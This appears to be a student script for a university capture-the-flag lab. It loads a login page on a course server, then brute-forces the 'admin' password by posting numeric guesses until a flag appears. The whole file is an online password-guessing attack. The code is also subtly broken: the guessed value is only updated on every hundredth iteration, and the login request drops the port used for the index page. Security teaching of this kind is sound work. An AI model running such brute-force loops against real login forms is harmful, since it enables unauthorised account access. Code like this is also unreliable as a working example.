import re
import requests

# Returns only the flag if there is one in the passed string, otherwise returns None
def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)

    return None

HOST = "http://t2.itsec.sec.in.tum.de"
PORT = 7002
# Use python f-strings to craft the URL
URL = f"{HOST}:{PORT}"

# Open a persistent session such that any cookies we receive from the server get sent across subsequent requests
session = requests.Session()

# Open the index page
response = session.get(URL)

# Print out the response (i.e. the HTML your browser would render)
print("This is the HTML we receive when opening the index page:")
print("--------------------------------------------------------")
print(response.text)
print("--------------------------------------------------------")

# Iterates through numbers [0, 10000)
for pw in range(0, 10000):

    # Manually perform the action of the login form
    if pw % 100 == 0:
        print(f"password: {pw}")
        pwd = str(pw)
    # TODO: Adjust the credentials we send in our login attempt
    values = {"username": "admin", "password": pwd}
    response = session.post("http://t2.itsec.sec.in.tum.de", data = values)

    
    # TODO: Check for the desired response and only then break out of the loop
    if "flag" in response.text:
        print(response.text)
        print(f"password: {pw}")
        break

print("Okay, done brute forcing the password")
